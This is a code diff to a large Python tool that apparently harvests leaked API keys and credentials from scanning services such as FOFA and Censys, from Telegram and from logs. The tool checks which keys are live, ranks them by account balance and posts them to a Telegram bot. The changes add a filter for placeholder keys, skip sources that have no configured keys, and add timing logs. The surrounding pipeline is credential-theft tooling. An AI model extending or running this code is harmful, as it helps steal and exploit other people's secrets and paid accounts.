@@ -1217,6 +1217,9 @@ JUNKY_KEY_RE = re.compile(
     # Все группы — незахватывающие, (.) остаётся группой №1.
     r"test[-_]?(?:key|token|api)|fake[-_]|dummy[-_]?(?:key|token)|"
     r"sample[-_]?(?:key|token)|abcdefgh|aaabbb|qwerty|AAA[-_]?bbb|bbb[-_]?CCC|"
+    # цифро-прогоны из доков/редакторов: 0123456789abcdef (credential_redaction.rs),
+    # 1234567890... — FP-риск для честных ключей ничтожен (нужен прогон >=6)
+    r"012345|123456|234567|345678|456789|"
     r"(.)\1{7,}",  # прогон одного символа 8+ раз (AAAAAAA...)
     re.I,
 )
@@ -15164,6 +15167,30 @@ def store(v):
 # Rate limit tracking: skip sources that hit rate limits
 RATE_LIMITED = {}  # {source_name: skip_until_cycle}
 CYCLE_COUNTER = 0
+_NOKEY_LOGGED = set()  # источники, про которые уже сказали «нет ключа» (1 раз/процесс)
+
+# АУДИТ (триаж нулевых, 2026-09-14): каким источникам какие ключи нужны.
+# Без ключа fetch() возвращает [] мгновенно — чистый шум цикла.
+_REQ_CFG = {
+    "fofa": ("fofa_email", "fofa_key"),
+    "censys": ("censys_id", "censys_secret"),
+    "netlas": ("netlas_key",),
+    "criminalip": ("criminalip_key",),
+    "greynoise": ("greynoise_key",),
+    "quake360": ("quake_key",),
+    "hunter": ("hunter_key",),
+}
+
+
+def _keyless_sources(sources):
+    """Имена источников без нужных API-ключей в конфиге."""
+    return {
+        s.name
+        for s in sources
+        if s.name in _REQ_CFG and not all(CFG.get(k) for k in _REQ_CFG[s.name])
+    }
+
+
 SOURCE_HEALTH_PATH = os.path.join(HERE, "source_health.json")
 SOURCE_HEALTH_LOCK = threading.RLock()
 
@@ -15427,6 +15454,19 @@ def run_sources(extra_paths=()):
     disabled = set(CFG.get("disabled_sources", []))
     if disabled:
         all_sources = [s for s in all_sources if s.name not in disabled]
+    # АУДИТ (триаж нулевых, 2026-09-14): источники без API-ключей возвращали []
+    # мгновенно КАЖДЫЙ цикл — мусор в логе + качели автоскипа (3×0 → skip 3).
+    # Теперь: нет ключа — источник спит до появления ключа, анонс один раз.
+    missing_now = _keyless_sources(all_sources)
+    if missing_now:
+        all_sources = [s for s in all_sources if s.name not in missing_now]
+        fresh = missing_now - _NOKEY_LOGGED
+        if fresh:
+            log(
+                "  🔑 нет ключей в конфиге, источники спят: %s"
+                % ", ".join(sorted(fresh))
+            )
+            _NOKEY_LOGGED.update(fresh)
     # фильтруем rate-limited и circuit-broken источники
     skipped_health = {
         s.name for s in all_sources if source_health_remaining(s.name) > 0
@@ -17252,6 +17292,7 @@ def run_once(extra_paths=(), post=True):
     t0 = time.time()
     reset_board_health()  # сброс кэша недоступных бордов на новый цикл
     chunks = run_sources(extra_paths)
+    t_src = time.time()  # ФАЗЫ: источники отработали
     # 📥 TG-чат бота как источник: dj шлёт ключи напрямую
     try:
         _tg_chunks = tg_ingest_keys()
@@ -17279,6 +17320,7 @@ def run_once(extra_paths=(), post=True):
         pass
     except Exception as _lhe:
         log("  loghunter err: %s" % _lhe)
+    t_ing = time.time()  # ФАЗЫ: +tg/loghunter ingest
     log("=== EXTRACT ===")
     seen = load_seen()
     try:
@@ -17411,6 +17453,7 @@ def run_once(extra_paths=(), post=True):
         log("  (store: %s)" % STORE_PATH)
         return []
 
+    t_ext = time.time()  # ФАЗЫ: +extract/dedup/creds
     log("=== VALIDATE (%d) ===" % len(candidates))
     found = []
     t_validate = time.time()
@@ -17646,8 +17689,17 @@ def run_once(extra_paths=(), post=True):
     attempts = {h: n for h, n in attempts.items() if h not in seen}
     _atomic_json_dump(attempts_path, attempts)
     log(
-        "=== ИТОГ: %d живых / %d кандидатов за %.1fs ==="
-        % (len(found), len(candidates), time.time() - t0)
+        "=== ИТОГ: %d живых / %d кандидатов за %.1fs"
+        " (src %.0f + ing %.0f + ext %.0f + val %.0f) ==="
+        % (
+            len(found),
+            len(candidates),
+            time.time() - t0,
+            t_src - t0,
+            t_ing - t_src,
+            t_ext - t_ing,
+            time.time() - t_ext,
+        )
     )
     for v in sorted(found, key=lambda x: -(x.get("balance") or 0)):
         if v.get("_tg_posted"):
